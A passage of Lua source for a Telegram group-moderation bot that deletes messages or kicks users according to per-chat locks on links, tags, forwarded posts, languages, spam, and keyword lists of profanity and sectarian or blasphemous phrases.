if KASPERdx1:get(KASPER..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end end end
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if KASPERdx1:get(KASPER.."bot:welcome"..msg.chat_id_) then
if KASPERdx1:get(KASPER..'get:welcome'..msg.chat_id_) then
text = KASPERdx1:get(KASPER..'get:welcome'..msg.chat_id_)
else
text = '✟︙هلا بالكمر 👋 ،\n✟︙name ،\n✟︙@user ،\n✟︙في '..title_name(msg.chat_id_)..' ،\n'
end
local text = text:gsub('name',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('user',(msg.content_.members_[0].username_ or 'KASPER_Ch'))
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     By Developer KASPER     -- 
-------- Contact
elseif msg_type == 'MSG:Contact' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end end end
if KASPERdx1:get(KASPER..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end end
--     By Developer KASPER     -- 
-------- Audio
elseif msg_type == 'MSG:Audio' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end end end
if KASPERdx1:get(KASPER..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end end
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end end
if msg.content_.caption_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Audio]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end end end end
--     By Developer KASPER     -- 
-------- Voice
elseif msg_type == 'MSG:Voice' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end end end
if KASPERdx1:get(KASPER..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end end
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end end
if msg.content_.caption_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Voice]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end end end end
--     By Developer KASPER     -- 
-------- Location
elseif msg_type == 'MSG:Location' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end end end
if KASPERdx1:get(KASPER..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end end
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end end
if msg.content_.caption_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Location]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Location]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end end end end
--     By Developer KASPER     -- 
-------- Video
elseif msg_type == 'MSG:Video' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end end end
if KASPERdx1:get(KASPER..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end end
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end end
if msg.content_.caption_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Video]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Video] ")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end end end end
--     By Developer KASPER     -- 
-------- Gif
elseif msg_type == 'MSG:Gif' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end end end
if KASPERdx1:get(KASPER..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end end
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end end
if msg.content_.caption_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Gif]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Gif]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end end end end
--     By Developer KASPER     -- 
-------- Text
elseif msg_type == 'MSG:Text' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
KASPERdx1:setex(KASPER..pm, TIME_CHECK, msgs+1)
end end
--vardump(msg)
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
KASPERdx1:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if KASPERdx1:get(KASPER..'bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end end end
getUser(msg.sender_user_id_,check_username)
KASPERdx1:set(KASPER..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Text]")
if KASPERdx1:get(KASPER..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
if KASPERdx1:get(KASPER..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end end end
if msg.content_.text_:match("@") then
if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end end
if msg.content_.text_:match("#") then
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Text]")
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Text]")
end end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local hash = 'bot:sens:spam'..msg.chat_id_
if not KASPERdx1:get(KASPER..hash) then
sens = 400
else
sens = tonumber(KASPERdx1:get(KASPER..hash))
end
if KASPERdx1:get(KASPER..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end end end end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ الرابط .', 1, 'md')
KASPERdx1:del(KASPER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
KASPERdx1:set(KASPER.."bot:group:link"..msg.chat_id_,Link)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم صنع الرابط الجديد .\n✟︙ارسل (الرابط) لعرض الرابط .', 1, 'md')
KASPERdx1:del(KASPER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end end
--     By Developer KASPER     -- 
local msg = data.message_
text = msg.content_.text_
if text and is_monsh(msg.sender_user_id_, msg.chat_id_) then 
if KASPERdx1:get('KASPER:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
KASPERdx1:del('KASPER:'..bot_id..'id:user'..msg.chat_id_)  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء الامر .', 1, 'md')
KASPERdx1:del('KASPER:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
KASPERdx1:del('KASPER:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = KASPERdx1:get('KASPER:'..bot_id..'id:user'..msg.chat_id_)  
KASPERdx1:incrby('KASPER:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
KASPERdx(msg.chat_id_, msg.id_,  1, "✟︙تم اضافه له *{ "..numadded..' }* رساله . ', 1, 'md')
end end
--     By Developer KASPER     -- 
if text:match("طيز") or text:match("ديس") or text:match("كس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") or text:match("كوس") then
if KASPERdx1:get(KASPER.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id} 
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '✟︙عذرا عزيزي  [firstname](https://telegram.me/username) \n✟︙ممنوع الفشار هنا التزم فضلا .'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'KASPER_ch'))
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     By Developer KASPER     -- 
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER.."farsi"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
if KASPERdx1:get(KASPER..'far'..msg.chat_id_) == 'thhhh' then
delete_msg(chat, msgs)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ممنوع التكلم باللغه الفارسيه هنا  ', 1, 'md')   
elseif KASPERdx1:get(KASPER..'far'..msg.chat_id_) == 'bedthhh' then
delete_msg(chat, msgs)
end end end
--     By Developer KASPER     -- 
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER.."farsiban"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end
--     By Developer KASPER     -- 
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("طائفيه") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
if KASPERdx1:get(KASPER.."taf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '✟︙عذرا عزيزي  [firstname](https://telegram.me/username) \n✟︙ممنوع التكلم بالطائفيه هنا .'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'KASPER_ch'))
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     By Developer KASPER     -- 
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
if KASPERdx1:get(KASPER.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
